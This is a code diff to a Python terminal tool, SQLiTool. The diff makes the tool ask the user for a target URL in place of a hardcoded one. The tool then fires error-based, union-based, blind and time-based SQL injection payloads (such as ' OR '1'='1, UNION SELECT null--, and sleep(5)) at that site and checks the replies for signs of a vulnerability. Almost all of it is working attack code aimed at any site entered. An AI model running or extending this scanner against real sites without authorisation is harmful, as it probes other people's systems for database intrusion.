@@ -4,13 +4,6 @@ import time
 import curses
 from curses import wrapper
 
-# Target setup
-url = "http://targetsite.com/vulnerable_endpoint.php?id="
-headers = {
-    "User-Agent": "Mozilla/5.0",
-    "Content-Type": "application/x-www-form-urlencoded",
-}
-
 # Error patterns to detect SQL injection vulnerabilities
 error_patterns = [
     "SQL syntax", "mysql_fetch", "sql error", "unclosed quotation",
@@ -46,7 +39,16 @@ class SQLiTool:
         curses.curs_set(0)
         self.menu_options = ["Error-Based SQLi", "Union-Based SQLi", "Blind SQLi", "Time-Based SQLi", "Exit"]
         self.selected = 0
+        self.url = self.get_url()  # Get the URL from the user
         self.run_tool()
+
+    def get_url(self):
+        self.stdscr.clear()
+        self.stdscr.addstr(2, 2, "Please enter the target URL: ", curses.color_pair(1))
+        curses.echo()  # Enable echoing of user input
+        url = self.stdscr.getstr(3, 2).decode('utf-8')  # Get the user input
+        curses.noecho()  # Disable echoing again
+        return url
 
     def print_menu(self):
         self.stdscr.clear()
@@ -102,14 +104,15 @@ class SQLiTool:
         self.stdscr.addstr(y + 1, 2, "Press any key to return to the menu.")
         self.stdscr.refresh()
         self.stdscr.getch()  # Wait for user input to return to the menu
-
-        self.print_menu()  # Return to the menu after showing results
+        
+        # Call the print_menu method to show the menu again
+        self.print_menu()  
 
     def error_based_sqli(self):
         result = ["[Error-Based SQL Injection Test]"]
         payloads = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "UNION SELECT null--", " AND 1=1"]
         for payload in payloads:
-            response = requests.get(url + payload, headers=headers)
+            response = requests.get(self.url + payload)  # Use the input URL
             for error in error_patterns:
                 if re.search(error, response.text, re.IGNORECASE):
                     result.append(f"[+] Vulnerability found with payload: {payload}")
@@ -121,7 +124,7 @@ class SQLiTool:
         result = ["[Union-Based SQL Injection Test]"]
         for i in range(1, 10):  
             payload = f"' UNION SELECT {', '.join(['null']*i)}-- "
-            response = requests.get(url + payload, headers=headers)
+            response = requests.get(self.url + payload)  # Use the input URL
             if "unknown column" not in response.text.lower():
                 result.append(f"[+] Vulnerability detected with {i} columns.")
                 return result
@@ -132,8 +135,8 @@ class SQLiTool:
         result = ["[Blind SQL Injection Test]"]
         true_payload = "' AND 1=1-- "
         false_payload = "' AND 1=0-- "
-        true_response = requests.get(url + true_payload, headers=headers)
-        false_response = requests.get(url + false_payload, headers=headers)
+        true_response = requests.get(self.url + true_payload)  # Use the input URL
+        false_response = requests.get(self.url + false_payload)  # Use the input URL
         if true_response.text != false_response.text:
             result.append("[+] Blind SQL Injection Vulnerability Detected")
         else:
@@ -144,7 +147,7 @@ class SQLiTool:
         result = ["[Time-Based Blind SQL Injection Test]"]
         payload = "'; SELECT IF(1=1, sleep(5), 0); -- "
         start = time.time()
-        response = requests.get(url + payload, headers=headers)
+        response = requests.get(self.url + payload)  # Use the input URL
         elapsed = time.time() - start
         if elapsed > 5:
             result.append("[+] Time-based Blind SQL Injection Vulnerability Detected")
